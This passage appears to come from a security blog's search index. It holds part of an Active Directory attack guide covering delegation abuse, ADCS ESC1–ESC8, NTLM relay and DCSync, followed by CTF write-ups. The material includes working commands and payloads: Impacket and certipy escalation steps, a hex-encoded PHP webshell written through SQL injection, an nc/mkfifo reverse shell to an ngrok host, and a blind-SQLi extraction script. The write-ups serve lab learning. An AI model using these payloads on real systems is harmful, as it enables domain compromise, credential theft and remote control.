/service:krbtgt /nowrap\");Now, we have a base64 ticket, you can convert it as a ccache file like so:cat tgt.b64|base64 -d &gt; ticket.kirbiticketConverter.py ticket.kirbi ticket.ccacheexport KRB5CCNAME=/PATH/TO/ticket.ccacheAnd now we can use it to use command with this ticket like SecretsDump for exemple using the -k option.S4U2SelfS4U2Self is an extension of Kerberos. It allows a machine that does delegation to impersonate a user on itself. To be more specific, it allows the machine to get a ST for its service (itself) as any user. This is very convenient when a service does not use Kerberos as its authentication mechanism.Lets say that you try to connect to a service that uses the Net-NTLM authentication mechanism. Net-NTLM doesn’t use tickets, it is not related to Kerberos. This means that the delegation mechanism can’t work because it relies on the use of ST. Protocol Transition (PT) is the name of this mechanism. PT is the mechanism that allows connection from other protocols than Kerberos on a Kerberos environment. It does not allow a connection from another protocol, it allows a delegation from another protocol to kerberos.This is where the Protocol transition (PT) enter the scene. This will allow us to get a valid ST for our own service using S4U2Self for the user that just authenticated using Net-NTLM or an attacker can use it to impersonate any user on our service machine like the admin for example.S4U2Self produces forwardable tickets only if the user is not a member of the protected user group or if it does not have the UAC NOT_DELEGATED attribute set. It will be important for S4U2Proxy.S4U2ProxyS4U2Proxy as S4U2Self is also an extension of Kerberos. It allows the delegation server to ask for a ST for “any” user and use it on any service on which it has permission to delegate (only works with Kerberos). To be able to do that, S4U2Proxy needs a forwardable ST. The forwardable flag of a ST can be obtained thanks to S4U2Self (only if the two upper conditions specified in the S4U2Self section are not set).Constrained DelegationThen the Constrained Delegation was created. Here, the constrained delegation server can only impersonate users on specific services. As you can see on the bellow schema, the user can be impersonated only on the file server and not on the two other. Source: HacknDo The Contrained Delegation server ask the DC (Domain Controller) if it can receive a ST (Service Ticket) as the specified user. This is possible thanks to S4U2Proxy. Note that the information about if the Constrained Delegation server is allowed or not to impersonate a user on a specific server is stored in the DC not on the Constrained Delegation server. Only DA (Domain Admin) can change the delegation rights.To exploit the Constrained Delegation, we first need to find it using the following command:findDelegation.py $DOMAIN/$USER:$PASSWORD -target-domain $TARGET_DOMAINNow there are two scenarios. The first one is if there is protocol transition on the service that has the right to delegate.With protocol transitionIn this case, we first need to ask a TGT for the user we want to impersonate, then execute S4U2Self followed by S4U2Proxy to impersonate the administrator.For Windows, you can use Rubeus:.\\Rubeus.exe asktgt /user:$USER /domain:$DOMAIN /password:$PASSWORD.\\Rubeus.exe s4u /ticket:$TICKET /impersonateuser:administrator /msdsspn:CIFS/$DC_NAME /pttOr on Linux:getST.py -spn \"CIFS/$DC_NAME\" -impersonate Administrator -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORDWith the received ticket, we can export it and then use it to connect to the machine with tools like smbexec, psexec, wmiexec… You need to export the ticket using the export KRB5CCNAME=/PATH/TO/ticket.ccache commandWithout Protocol transitionIn this case, we need a forwardable ST as the administrator to any service on the server. Here, we can’t just ask for the ST like we did earlier with protocol transition so we need to create a machine and add delegation from our created machine to the server (that has delegation). Why would we do that ? Because the resulted ST from our created machine is a forwardable ticket on the server (that has delegation).First, we create our machine:addcomputer.py -computer-name 'rbcd_created_machine$' -computer-pass 'rbcdpass' -dc-host $DC_IP $DOMAIN/$USER:$PASSWORDNow, we add the RBCD from rbcd_created_machine$ to the server with Constrained Delegation.rbcd.py -delegate-from 'rbcd_created_machine$' -delegate-to $SERVER_NAME_WITH_DELEGATION -dc-ip $DC_IP -action 'write' -hashes \":$SERVER_HASH\" $DOMAIN/$SERVER_NAME_WITH_DELEGATIONNow that everything is set up, we can use S4U2Slef followed by S4U2Proxy on the server with delegation.# s4u2self on rbcd_created_machinegetST.py -self -impersonate \"administrator\" -dc-ip 192.168.56.11 north.sevenkingdoms.local/'rbcd_created_machine$':'rbcdpass'# s4u2proxy from rbcd_created_machine to $SERVER_NAME_WITH_DELEGATIONgetST.py -impersonate \"administrator\" -spn \"host/$SERVER_NAME_WITH_DELEGATION\" -additional-ticket 'TICKET_NAME.ccache' -dc-ip $DC_IP $DOMAIN/'rbcd_created_machine$':'rbcdpass'or using only one command:getST.py -spn \"host/$SERVER_NAME_WITH_DELEGATION\" -impersonate Administrator -dc-ip $DC_IP $DOMAIN/'rbcd_created_machine$':'rbcdpass'And finally, we use our forwardable ticket we just received to get a ST as the administrator on the DC and connect to it:getST.py -impersonate \"administrator\" -spn \"http/$DC_NAME\" -altservice \"cifs/$DC_NAME\" -additional-ticket 'TICKET_OF_ADMIN_OF_SERVER.ccache' -dc-ip $DC_IP -hashes \":$SERVER_HASH\" $DOMAIN/$SERVER_NAME_WITH_DELEGATIONexport KRB5CCNAME=/PATH/TO/TICKET_OF_ADMIN_OF_DC.ccache wmiexec.py -k -no-pass $DOMAIN$/administrator@$DC_NAMEResource Based Constrained DelegationResource Based Constrained Delegation (RBCD) works the other way around. It is not the RBCD server that checks if it has the right to impersonate the service (ex: web server).The machine account can change its own attribute and not only the DA can change it on the DC. If the machine is compromised, then we can get the hash of the machine account and then continue the attack. This means that if you create a machine (MachineAccountQuota &gt; 0) then you can specify that a specific server can impersonate your machine. Source: HacknDo To exploit an RBCD, we first need to create a machine:addcomputer.py -computer-name 'rbcd_created_machine$' -computer-pass 'rbcdpass' -dc-host $DC_IP $DOMAIN/$USER:$PASSWORDNow, we add the RBCD from rbcd_created_machine$ to the server with RBCD.rbcd.py -delegate-from 'rbcd_created_machine$' -delegate-to $SERVER_NAME_WITH_DELEGATION -dc-ip $DC_IP -action 'write' -hashes \":$SERVER_HASH\" $DOMAIN/$SERVER_NAME_WITH_DELEGATIONOur created machine has now delegation permission on our target, we can now use S4U2Self followed by S4U2Proxy and get an administrator ticket for the DC:getST.py -spn \"cifs/$DC_SPN\" -impersonate Administrator -dc-ip $DC_IP $DOMAIN/'rbcd_created_machine$':rbcdpassexport KRB5CCNAME=TICKET_OF_ADMIN_OF_DCwmiexec.py -k -no-pass @$DC_SPNADCSADCS or Active Directory Certificate Services is Microsoft’s PKI (Public Key Infrastructure). This means that ADCS allows integrity, authentication, non repudiation and confidentiality. Here we will be talking about ESC1 to ESC8 used for domain escalation. ESC stand for Escalation.The main idea is that if you have enough rights, you can ask for certificates for a specific user, recover its NT hash and pass it or crack it.Those appellations ESCX come from this paper from Will Schroeder and Lee Christensen also explained in this blog in a funnier way :).Here are the meaning of each ESC based on this paper: ESC1: Domain escalation via No Issuance Requirements + Enrollable ClientAuthentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT ESC2: Domain escalation via No Issuance Requirements + Enrollable Any PurposeEKU or no EKU ESC3: Domain escalation via No Issuance Requirements + Certificate RequestAgent EKU + no enrollment agent restrictions ESC4: Domain escalation via misconfigured certificate template access control ESC5: Domain escalation via vulnerable PKI AD Object Access Control ESC6: Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting onCAs + No Manager Approval + Enrollable Client Authentication/Smart CardLogon OID templates ESC7: Vulnerable Certificate Authority Access Control ESC8: NTLM Relay to AD CS HTTP Endpoints Well this is a lot… But we have a wonderful tool that allows us to check if the ADCS is vulnerable and can also be used to exploit it. Please welcome certipy!!!Vulnerable ADCSTo check if an ADCS is vulnerable, you will have to run the following command:certipy find -u \"$USER@$DOMAIN\" -p \"$PASSWORD\" -dc-ip \"$DC_IP\" -vulnerableThe output should look like this:Certificate Authorities 0 CA Name : CORP-CA DNS Name : CA.CORP.LOCAL ... Web Enrollment HTTP Enabled : False HTTPS Enabled : True Channel Binding (EPA) : False ... Permissions Access Rights ManageCa : CORP.LOCAL\\Authenticated Users ManageCertificates : CORP.LOCAL\\Authenticated Users Read : CORP.LOCAL\\Authenticated Users Enroll : CORP.LOCAL\\Authenticated Users [+] User Enrollable Principals : CORP.LOCAL\\Authenticated Users [+] User ACL Principals : CORP.LOCAL\\Authenticated Users [!] Vulnerabilities ESC7 : User has dangerous permissions. ESC8 : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.Certificate Templates 0 Template Name : UserTemplate Display Name : UserTemplate Certificate Authorities : CORP-CA Enabled : True Client Authentication : True ... Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Extended Key Usage : Client Authentication ... Permissions Enrollment Permissions Enrollment Rights : CORP.LOCAL\\Domain Users Object Control Permissions Write Property Enroll : CORP.LOCAL\\Domain Users [+] User Enrollable Principals : CORP.LOCAL\\Domain Users [!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication.ESC1As you can see, the CA (Certificate Authority) is vulnerable to ESC1. To be able to exploit it you can recover the admin certificate:certipy req -u $USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template ESC1 -ca $CA_NAME -upn administrator@$DOMAIN.localNow, we should have a file called administrator.pfx. With this file, we can use it to recover the administrator NT hash:certipy auth -pfx administrator.pfx -dc-ip $DC_IPESC2 /ESC3With ESC2 and ESC3 are using the enrolment agent to request a certificate. As for ESC1, we use certipy to request a certificate:certipy req -u $USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template ESC2 -ca $CA_NAMEcertipy req -u $USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template User -ca $CA_NAME -on-behalf-of '$NETBIOS_NAME\\administrator' -pfx $OUR_USER.pfxNow that we have the admin certificate, we can use it to recover the NT hash:certipy auth -pfx administrator.pfx -dc-ip $DC_IPAs you may have notice, we did this for the template ESC2, but we can run the following commands to exploit ESC3-CRA and ESC3 templates:certipy req $USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template ESC3-CRA -ca $CA_NAMEOrcertipy req $USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template ESC3 -ca $CA_NAME -on-behalf-of '$NETBIOS_NAME\\administrator' -pfx $OUR_USER.pfxAnd finally get the NT hash:certipy auth -pfx administrator.pfx -username administrator -domain $DOMAIN.local -dc-ip $DC_IP Because the recovery of the NT hash is always the same command, I will not write this step anymore but you can check the ESC1 and ESC2/ESC3 to see how it is done.ESC4In ESC4, we will write privilege over a certificate template. Here, we are going to cheat a bit XD. We are not going to exploit ESC4 as we did with the previous template exploit. Here, we are going to use ESC4 to change the template and make it vulnerable to ESC1:certipy template -u $USER@$DOMAIN.local -p $PASSWORD -template ESC4 -save-old -debugNow that the template is vulnerable to ESC1, we can exploit it as follows:certipy req -u USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template ESC4 -ca $CA_NAME -upn administrator@$DOMAIN.local Because we did a modification over the template, we can rollback to the previous template using this command certipy template -u USER@$DOMAIN.local -p $PASSWORD -template ESC4 -configuration ESC4.json The ESC4.json is generated in the first command thanks to the parameter -save-old.ESC5Because ESC5 is less common and used so here is a link that explains it in detail.ESC6With ESC6, we are going to abuse the ATTRIBUTESUBJECTALTNAME2 flag set on the CA. This flag allows the enrollee to specify an arbitrary SAN (Subject Alternative Name) on all certificates despite a certificate template’s configuration. To get the certificate, we can run the following command:certipy req -u USER@$DOMAIN.local -p $PASSWORD -target $CA_SERVER.$DOMAIN.local -template User -ca $CA_NAME -upn administrator@$DOMAIN.localESC7As for ESC5, ESC7 is also not common and used so here is another link to get more information about it.ESC8ESC8 is a bit different. We don’t request directly a certificate and use it to get the administrator NT hash. Here we are going to use NTLM Relay (this attack will be explained in more details in the next chapter). But the main idea is that we are going to receive a connexion with a Coertion for exemple (Coertion is the action to force a machine to authenticate to us.) and then use this received connexion to relay it to the same protocol or a different one (for more information check out the NTLM relay chapter). For more simple exemple, we are going to use certipy that will do the NTLM relay for us.First, we use certipy as a listener:certipy relay -ca $CA_IP -template DomainControllerNow we are going to use the tool petitpotam that will trigger the coertion:petitpotam.py $OUR_IP $DC_NAME.$DOMAIN.local We could have used Responder or mitm6 to recover the connection instead of petipotam. This will not use coertion but spoof different protocols to recover a connection and send it to certipy.We recover the NT hash and TGT of the DC from the certificate :certipy auth -pfx CERTIFICATE.pfx -dc-ip $DC_IP For information purpose, in all above cases, certipy auth does not always work, but even when we can’t use it, the ESC is still exploitable by other means.NTLM RelayFirst of all, NTLM is NOT an isolated protocol that generates network traffic. It is only a authentication protocol. It must be embedded in applications protocols like SMB, LDAPor HTTP to work. You can have more information on the NTLM protocol on this section.The NTLM relay is using MiTM (Man in The Middle) attack. We need to be between the client and the server. The goal here is that the server believes that we (the attacker) are the client and that the client believe that we (the attacker) are the server. But if you remember the challenge/response scheme from the NTLM section, we need the NT Hash of the user to be able to calculate the response to the challenge and we don’t have it. So this is when the MiTM become useful.As we can see on the scheme, the attacker receives the NEGOCIATE message from the client that thinks it sent it to the server. The attacker then sends the NEGOCIATE message to the server that thinks the client is starting a new communication. Then the full challenge/response is done the same way as for the negotiation part without the client nor the server knowing that the attacker is receiving and sending everything. Now, we have a session as the client on the server and we can act as him. Note that this isn’t possible if protocols are signed (ex: SMB with signing True, HTTPS, LDAP with channel binding enabled). This is because we will have a session as this user but because we don’t have his password we can’t sign the messages that follow the authentication part. The server will see that the messages are not signed correctly and it will drop the connection.You can see on the following image the protocols that can be relayed. Some can be relayed from one another and some can’t. This is due to how they manage their authentication mechanism: Source: thehackerrecipes Note that it is not possible to relay from SMB to LDAP (except using CVE-2019-1040)NTLM Relay - ExempleWe can use tools like Responder and ntrlmrelayx to do some relay. You can find examples on how to use those tools on the provided links.DCSyncWe have seen a lot of attacks by now on an AD. Some of them allowed us to get domain admin access (access over all the domain like DC and servers). When we are domain admin or if we have a user with DCSync right, a cool thing to do is to recover every hash of every user and every machine. And when we do that, we can connect as any user on any machine (if it is allowed). Hence, because we also have the domain admin hash, we can connect with it on any machine of the domain.This mechanism is called DCSync (dump of the DC information). It can be use by domain administrators for backups and by attackers to retrieve credentials. We can use tools like secretsdump to do that using a Kerberos ticket :export KRB5CCNAME=/workspace/esc8/CCACHE_FILE.ccachesecretsdump -k -no-pass $DOMAIN.LOCAL/\"$MACHINE\"@$DC_NAME.$DOMAIN.localOr, we could just dump all the hash of the domain using the NT hash instead of the TGT:secretsdump -hashes \":$NT_HASH_OF_DC_ACC\" -no-pass $DOMAIN.LOCAL/\"$MACHINE\"@$DC_NAME.$DOMAIN.local" }, { "title": "CTFs | Finale_CTF_INSA_2024 | Realiste", "url": "/CTFs/Finale_CTF_INSA_2024/Realiste/", "categories": "CTFs, CTF_INSA_Final, Realiste", "tags": "kerberoast, asreproast, kerberos, crypto", "date": "2024-04-04 00:00:00 +0200", "snippet": "RéalisteKerb1For this challenge, we are going to use the well known AS-REPRoasting attack. I will not explain in detail how the attack work but you can have more information here. The main idea is that some user may have the preauthentication disabled allowing to request a TGT (Ticket Granting Ticket) as this user. This allows us to crack the password of this user offline.EnumerationFirst we need to check if there is any AS-REPRoastable account. We have two ways to do it. The first one (the prettier) is by using bloodhound-python. This tool will allow us to recover all information on the domain. You will need a user of the domain to do so (we have bob): Here is the command to run bloodhound:bloodhound-python -u bob -p bobby -d ctf.local -ns 172.10.0.59 --zip -c AllNow that we generated a zip file containing all the data of the domain we can run the bloodhound GUI to get a beautiful graph of the data we collected: Here are the steps to configure the bloodhound GUI. You need to install and configure Neo4j.As we can see, there is two domain admin in the domain ctf.local. We can use the panel of bloodhound to get information about possible AS-REPRoastable account:We only have one user that looks AS-REPRoastable account and it is bob-admin:AS-REPRoastingThe other method to get this information is by using the Impacket list of tools. We can use GetNPUsers.py to list all the user having the preauthentication disabled: Don’t forget to add ctf.local into your /etc/hosts file with the correct IP.We now run the command with some more parameter to request the TGT: Here is the command to run:GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip 172.10.0.58 ctf.local/bob:bobbyCrackingNow that we have the TGT, we can try to crack it offline using tools like Hashcat: Here you have to use the -m 18200 flag in hashcatGet a shell dudeNow that we have the password of bob-admin, we can connect to the DC (Domain Controler) as him. Because we are admin now, we can list the shares C$ and ADMIN$ this can allow us to recover the flag by searching in the SMB shares. But why do that when we can have a shell using PSExec. First we can check that we are indeed domain admin by using CrackmapExec: Note that we know we are domain admin because we see the Pwn3d! attribute and because we can READ,WRITE into the C$ and ADMIN$ shares of the DC.Now that we know that we are domain admin, we can use PSExec to get a shell:And now that we have a shell, we can go into our desktop folder and get the flag:Kerb2For this challenge, we are going to use the well known Kerberoasting attack. As for the AS-REPRoasting part, I will not explain in too much detail the attack but you can find more information on how it work here. The main idea is that some user may have a SPN (EXPLANATION). An SPN is an attribute that, by default, only machine account have. Any user of the domain is allowed to query a ST (Service Ticket) of a user having an SPN.As for the AS-REPRoasting, we can find the interesting user with bloodhound or with the impacket tools. Because we just have to click on a upper button for bloodhound, I will only explain the steps using impacket.KerbeRoastingWe can use GetUserSPNs to find all users having an SPN: Note that there is bob-admin and krbtgt$. This is because krbtgt$ is a service (as the $ specifies). We can’t crack the password of krbtgt$ because it is a 200 characters long random string. Here is the command to find all kerberoastable account:GetUserSPNs.py -dc-ip 172.10.0.59 ctf.local/bobNow that we found the bob-admin user as a kerberoastable account, we can request an ST of this user: The full command is:GetUserSPNs.py -dc-ip 172.10.0.59 ctf.local/bob -request-user bob-admin -outputfile bob-admin.hashNow we can use tools like hashcat or john to crack it offline. And we find the admin password: The hashcat mode used here is -m 13100Get a shell dudeAs seen previously, we can now use PSexec to get a shell on the DC:And here is the flag:Admin FileAs you can see, there are a lot of files (no picture yet… teachers didn’t gave us access back to the chall ^^). But a file caught my attention. The Creds.txt. This file contain the text kliphu : Rvvspe it is just the ROT 7 of debian : Koolix.You can see the Admin2.php code when you click on it. When we go to the path of this files, we can see… It’s a webshell:With this, we can get a reverse shell thanks to a basic nc mkfifo (cf. revshells.com) .And now we are www-data. we can su as debian OR we could just ssh with the previously found credentials and have a really stable shell. And we can now get the first flag:As we can see, we have the right to run the python command as any user (root also ;) ). So we go to the beautiful website GTFOBins and find the command to get a root shell. And… Voilà:Up to dateOn this challenge we are given a URL. This website hosts a Drupal CMS:When we search for the string Drupal in the source code, we get that the version is 7:Now when we look for an exploit, we find this Drupalgeddon RCE unauthenticated. We launch the attack and get a shell: At the time of writing, the ruby exploit didn’t worked. I used the this one to write this WU. It’s a python exploit and we juste have to replace the command id by a reverse shell command like nc mkfifo (cf. revshells.com)With the www-data user, i get the flag: During the CTF, there was a protection on the home folder of debian. We could list all the files but couldn’t get the rights to list the rights, read or write anything in this folder. Here we have much more rights and we can see each right for each file.Because there was nothing owned by debian, the only possible way to get his session was to find his password. That was… debian…Now that we are connected as debian we have any rights on his home directory but we can’t run any command as sudo…If we get a step back, we find that another user can:Now we can use the well known library hijacking method to get a root shell. We can first read the ping.py file: Note that we are doing a library hijacking because we can’t write in the ping.py file. But if it was possible, we would have just put a reverse shell in it.We know that the library to hijack is request. Now we can create our own library requests.py and make ping.py import it. To do so, we juste have to create our library in the same folder (hence the necessity to get debian account): For more information about python library hijacking you can check this blog. Section 2 is our case. Note that we can launch the attack from any directory. The only requirement is that the library we create is in the same folder as the executable.And… Voilà… We have the root flag:XAMPIn this challenge, we are facing a worpress website. We can see that in many ways but the easier is by looking at the robots.txt that shows us wp-admin page:What’s cool about a worpress misconfigured, is that we know when we have the right user thanks to the error message:A way to find the admin user is by searching for a post he created or by going at the URL /wp-json/wp/v2/users:Now that we have the admin user, we can use it to find the correct password by bruteforcing the authentication page. To do that I advise to to use wpscan. This tool can be used for the enumeration phase too (list plugins, templates, CVE…): The output is big, so here is the initial command:wpscan --password-attack xmlrpc -t 20 -U pwnme -P /usr/share/wordlists/rockyou.txt --url http://172.10.0.42Now that we have the credential of the admin we can use it to authenticate and get a shell on the machine. The default technique to get a reverse shell didn’t worked because of the new interface. But the technique is good to know because we are going to do piratically the same. We first need to add an extension (go to Extnsions &gt; Ajouter une extension) .Now that the extension is installed, it has some PHP pages we can inject. We need to go into the Outils &gt; Éditeur de fichiers des extensions section and modify the extension. We can set the basic command system(\"whoami\"); and save the result:And activate it:Now we head back to the URL http://172.10.0.42/jetpack/jetpack.php and we get the result of our command:We can now use a basic PHP command to get a reverse shell (cf. windows-php-reverse-shell) instead of our system(\"whoami\");:We can activate the plugin to get the shell. We can see the flag at the root of the file system:And voilà… We have the flag:" }, { "title": "CTFs | Finale_CTF_INSA_2024 | Forensique", "url": "/CTFs/Finale_CTF_INSA_2024/Forensique/", "categories": "CTFs, CTF_INSA_Final, Forensique", "tags": "Forensique, bitlocker, john, keypass", "date": "2024-04-04 00:00:00 +0200", "snippet": "ForensiqueMy Name Is ?In this challenge, we are asked to find the name of the user that juste have been powned. To do this, we just have to run the envars command of volatility.Using volatility2, we first need to get the image info:Now we use the envars to list all the environment variables:And at the end of the file, we have the username we are looking for:WallpaperIn this challenge, we are tasked to recover the wallpaper of the user. But when we try to dump the file C:\\Users\\FLAG{GooDN4me}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper.jpg we get nothing extracted. This value was found in the registry key using the command vol2 -f memory2.raw --profile=Win7SP1x64 printkey -o 0xf8a00180f010 -K \"Control Panel\\Desktop\" -v Note that 0xf8a00180f010 is the virtual address of ntuser.dat when we used the hivelist function of volatility.We can list all the process using the pslist function of volatility and we find those two process that are dealing with various aspects of the graphical user interface (GUI) in Windows:We can dump those process using their pid 1912 and 1932:Now that we have the dump of both process, we can rename the dump file as name.data. This will allow us to open this raw data in GIMP and see the desktop. Using dwm.exeUsing explorer.exe Here is a link talking about the raw vision of gimpThanks to kwikkill for the help he gave me to write this solution.MyPasswordAs in the previous CTF INSA forensic challenge, we had to mix a bit of all the previous techniques.First we have to extract the hash of the disk image (boot sector) that is bitlocker encrypted:Now we run john on the hash and retrieve the password:As seen previously here, we download the dislocker extension of volatility2 and use it to extract the fvek files: Here is the command to copy paste :)volatility2 -f memory.raw --profile=Win7SP1x64 bitlocker --dislocker export/Now we analyse the disk with fdisk and find an interesting device:We now use dislocker to retrieve the unencrypted data:We mount the decripted disk to our file system and recover a keepass file:Now we just recover the hash using keepass2john and crack it with john:With the password of the keepass, we can open the file using keepassxc and recover the flag:" }, { "title": "CTFs | CTF_INSA_2024 | Web | SQLi", "url": "/CTFs/CTF_INSA_2024/Web/SQLi/", "categories": "CTFs, CTF_INSA_2024, Web", "tags": "web, SQLi", "date": "2024-02-05 00:00:00 +0100", "snippet": "SQLi 1Here, we are tasked to perform SQL injections. An IPS is configured, this means that we can’t use tools like SQLMap because we would be blocked. We can see, that we are facing a login page. In CTF environment, the first thing that comes to your mind when you see a login page (after trying default credentials) is to perform an SQLi to bypass the authentication process. Using the payload admin' OR True -- - will result in a SQL query looking like:Select * From Users where username='admin' OR True -- - AND password='a'As you can see, we are looking for the username admin but we use a True statement. The username='admin' OR True will result in a True statement. This will authenticate us as the first user in the database that is often the admin. Note the use of -- -, this allows us to comment the rest of the query. Thanks to that, we can bypass the need of the password.And voilà, we are authenticated as admin and we have the flag:SQLi 2Here we need to perform a more difficult SQLi. We first need to search for the vulnerable parameter. Here it is id:We will try a UNION based SQLi. First we need to know how much columns are used in the SQL query. To do that we can simply use a payload like UNION SELECT NULL -- - then if there is no page printed out, we use the payload UNION SELECT NULL,NULL -- - and so on until we have a page that we can see:As we can see from our UNION based SQLi, we know that there are 4 rows in the query. We can now use this to read file like in the LFI 2 challenge:http://ctf.insa-cvl.fr:1003/post.php?id=-1%20UNION%20SELECT%20NULL,to_base64(load_file(%22/var/www/html/index.php%22)),NULL,NULL%20--%20-This payload gives us a base64 string of the content of index.php source code. We can decode it and we get:There is no flag here. But we notice a file called db_config.php. Lets check this file:And voilà… We get the username and password for the database and the flag.SQLI 3Now this challenge is a bit harder than the previous one because we need to upload a shell to the machine. It can be a reverse or web shell, it doesn’t matter. As we can see, when we enter a string we get the exact syntax of the SQL query:We will use the following payload to write into the css folder (the only one where we have rights) in the bipbip.php file.' union select NULL, 0x3c3f7068700a20202020696628697373657428245f4745545b27636d64275d29202626204d443528245f4745545b2770617373275d29203d3d2022636136333537343336306235303061626133336333356163393334333535663122290a202020207b0a202020202020202073797374656d28245f4745545b27636d64275d293b0a202020207d0a3f3e0a into dumpfile '/var/www/html/css/bipbip.php' #The content of the hexadecimal string it the following:&lt;?php if(isset($_GET['cmd']) &amp;&amp; MD5($_GET['pass']) == \"ca63574360b500aba33c35ac934355f1\") { system($_GET['cmd']); }?&gt; Note the use of the hex string instead of putting the plain PHP code. This is because sometimes you will get errors because some characters can be removed for exemple. Note the use of a password. This is a good practice because you don’t want other teams to be able to use you shell and in a more realist environment you don’t want hackers to be able to use the tools that you are using in your pentest to exploit the company you are assessing.Now we can just call our file and specify the command and the password:We want a reverse shell on the machine, I used this one:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 4.tcp.eu.ngrok.io 14433 &gt;/tmp/fNote that if you copy/paste this payload in your cmd parameter it won’t work. You will have to URL Encode it first (and change the IP and port by your values ;) ) .I already set up a listener using nc -lvnp 4444 and a ngrok to be able to be accessible by the server (ngrok tcp 4444). Here we are using ngrok because we are not on the same network as the machine we are trying to hack. In CTF like Try Hack Me we don’t need ngrok and can simply use nc -lvnp 4444 because we will have an IP on the same network.As you can see, I got a shell and I beautified it:Now we can access the full database by simply connecting to mysql using default credentials. Those credentials can be found in the PHP source code of the web pages:mysql -u root -prootNow we can list databases, list tables inside the loginsqli and show all the values in the users table:We now have the password of bob (superbob) that is the flag to validate the challenge.Here is a python code that will use an blind/error based SQLi. It performs a dichotomy to retrieve character by character the name of the database, the name of the tables, the name of the columns and the values:import requestsimport timeimport stringfrom math import ceil, floorurl_base = \"http://ctf.insa-cvl.fr:1009/\"alphabet = r\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~\"timing = 1results = []offset = 0while 1: candidats = [\"\"] while candidats: #print(candidats) candidat = candidats.pop(0) index = len(candidat) + 1 #print(\"My candidat:\",candidat, \"Len candidat:\", index) print(candidat) start = 0 end = 127 found = 0 old_candidat = candidat while 1: mid = floor((start + end) // 2) #print(start, mid, end) time.sleep(0.05) #payload = f\"1; select case when ascii(substring(version(), {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end-- -\" #payload = f\"1; select case when ascii(substring(datname, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from pg_database limit 1;-- -\" #payload = f\"1; select case when ascii(substring(table_name, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from information_schema.tables limit 1;-- -\" #payload = f\"1; select case when ascii(substring(column_name, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from information_schema.columns limit 1 offset {offset};-- -\" #payload = f\"1; select case when ascii(substring(password, {index}, 1))&gt;={mid} then pg_sleep({timing}) else pg_sleep(0) end from users limit 1 offset {offset};-- -\" #payload = f\"admin' and ascii(MID(version(), {index}, 1))&gt;={mid}-- -\" #payload = f\"admin' and ascii(MID(database(), {index}, 1))&gt;={mid}-- -\" #payload = f\"admin' and ascii(MID((select group_concat(table_name) from information_schema.tables where table_schema=database()), {index}, 1))&gt;={mid}-- -\" #payload = f\"admin' and ascii(MID((select group_concat(column_name) from information_schema.columns where table_name='users'), {index}, 1))&gt;={mid}-- -\" #payload = f\"admin' and ascii(MID((select username from users limit {offset},1), {index}, 1))&gt;={mid}-- -\" #payload = f\"admin' and ascii(MID((select description from users limit {offset},1), {index}, 1))&gt;={mid}-- -\" payload = f\"admin' and ascii(MID((select fname from users limit {offset},1), {index}, 1))&gt;={mid}-- -\" #(select if((ascii(MID(@@version,{index},1)))&gt;={mid}, sleep({timing}, 0)))-- #' or (select if(MID(@@version,{index},1))&gt;={mid}, sleep({timing}), 0)-- - #print(payload) url_final = url_base data = { \"username\": payload } #start_time = time.time() response = requests.post(url_final, data=data) #print(response.text) #delta = time.time() - start_time #print(delta) if \"demande\" in response.text: if mid == start: #print(chr(mid)) char = chr(mid) if char != '\\x00': candidats.append(candidat + char) else: results.append(candidat) break else: start = mid else: end = mid offset += 1print(results)" }, { "title": "CTFs | CTF_INSA_2024 | Web | MegaUpload", "url": "/CTFs/CTF_INSA_2024/Web/MegaUpload/", "categories": "CTFs, CTF_INSA_2024, Web", "tags": "upload, ssh", "date": "2024-02-05 00:00:00 +0100", "snippet": "MegaUpload1 - Bypass upload filterFor this challenge, we have a website where we can upload files. But the upload is limited to image files (.jpg) and text files (.txt), other files return an error:Each uploaded files are in /uploads/ directory. We can see that if we run a Gobuster on the website.We need to bypass the filter extension, for that, we can try to upload a .htaccess file with a new rule read by the web server. This rule allows web server to run PHP code inside .jpg files. Here is a blog talking more in detail about bypass filter upload.And it works!With this rule, we can now upload and execute arbitrary PHP code inside .jpg files and, with this script, get a reverse shell:2 - Become another userFirst we get a shell and beautify it:We can read the /etc/passwd to check all existant user.There is a user named debian, so we go see what it has in his home directory and find a readable ssh private key:We try to connect with the ssh key to debian user but ssh asks for a password:This means the key is encrypted, so we have to find the key password. For that, we download the key on our kali and use ssh2john to extract the hash in a john format. And now we can use john to crack the hash using the rockyou word list.Fine, we can connect to debian user:3 - Become rootWe try sudo -l to see which command can execute debian:debian can execute tar with no password as any user (ex: root), we search on gtfobin the tar command that can gives us a root shell:We execute the given tar command and as you can see, we get a root shell:And the flag is inside the /root directory." }, { "title": "CTFs | CTF_INSA_2024 | Web | LFI", "url": "/CTFs/CTF_INSA_2024/Web/LFI/", "categories": "CTFs, CTF_INSA_2024, Web", "tags": "web, LFI, wrapper", "date": "2024-02-05 00:00:00 +0100", "snippet": "LFI 1In this challenge, we are tasked to perform LFI on the given website. The LFI vulnerability often appear in the GET parameter directly in the URL. Here we can notice the ?page=accueil.php where the GET parameter is page and its value is accueil.php. Note that here we only have one GET parameter so the URL ends with ?page=... but if we would have multiple parameters, we would have a URL looking like 